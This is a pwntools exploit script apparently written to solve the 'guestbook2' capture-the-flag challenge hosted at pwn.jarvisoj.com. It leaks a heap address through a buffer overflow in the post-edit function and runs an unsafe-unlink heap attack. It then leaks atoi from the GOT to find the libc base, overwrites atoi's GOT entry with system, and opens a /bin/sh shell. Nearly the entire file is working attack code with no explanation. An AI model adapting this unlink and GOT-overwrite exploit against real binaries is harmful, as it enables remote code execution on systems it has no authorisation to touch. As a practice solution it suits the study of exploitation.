#coding:utf-8

from pwn import *

context.log_level = "debug"

local = 0
if local:
    # env = {"LD_PRELOAD":"./libc.so.6"}
    p = process("./guestbook2")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    # gdb.attach(p, "b* 0x04010A8\nc")
else:

    # nc pwn.jarvisoj.com 9879
    p = remote("pwn.jarvisoj.com", 9879)
    libc = ELF("./libc.so.6")
    raw_input("go")


def action(number):
    p.sendlineafter("Your choice: ", str(number))

def new(length, post):
    action(2)
    p.sendlineafter("Length of new post: ", str(length))
    p.recvuntil("Enter your post: ")
    p.send(post)

def delete(number):
    action(4)
    p.sendlineafter("Post number: ", str(number))

def list():
    action(1)

def edit(number, length, post):
    action(3)
    p.sendlineafter("Post number: ", str(number))
    p.sendlineafter("Length of post: ", str(length))
    p.recvuntil("Enter your post: ")
    p.send(post)

new(0x20, 'a'*0x20) # 0
new(0x20, 'b'*0x20) # 1
new(0x20, 'c'*0x20) # 2
new(0x20, 'd'*0x20) # 3
new(0x20, 'e'*0x20) # 4


########## leak heap address
delete(3)
delete(1)
edit(0, 0x90, 'a'*0x90)
list()
p.recvuntil('a'*0x90)
data  = p.recvuntil('\n').strip().ljust(8, '\x00')
leak_heap_addr = u64(data)
info("leak data {}".format(hex(leak_heap_addr)))
heap_base = leak_heap_addr - 0x90*3-0x1820
info("heap_base  @ {}".format(hex(heap_base)))
chunK_0_ptr = heap_base + 0x30
info("chunk 0 ptr address is {}".format(hex(chunK_0_ptr)))
# edit()

########### unlink
payload = p64(0) + p64(0x80) + p64(chunK_0_ptr-0x18) + p64(chunK_0_ptr-0x10) +'a'*(0x80-0x20)
payload += p64(0x80) + p64(0x90) + 'b'*(0x70)
edit(0, len(payload), payload)
delete(1)

########### leak atoi address, get libc base address
paylaod = p64(2) + p64(1) + p64(0x100) + p64(0x000000000602070)
paylaod += '\x00'*(0x100-len(paylaod))
edit(0, len(paylaod), paylaod)
list()
p.recvuntil("0. ")
atoi_addr = u64(p.recvuntil("\n").strip().ljust(8, '\x00'))
info("atoi address @ {}".format(hex(atoi_addr)))
libc.address = atoi_addr - libc.symbols['atoi']

########## write atoi.got , fix the stdout and stdin
paylaod = p64(libc.symbols['system']) + p64(0)*3 + p64(libc.symbols["_IO_2_1_stdout_"]) + p64(libc.symbols['_IO_2_1_stdin_'])
paylaod += '\x00'*(0x100-len(paylaod))
edit(0, 0x100, paylaod)

p.recvuntil("Your choice: ")
p.sendline("/bin/sh")

p.interactive()
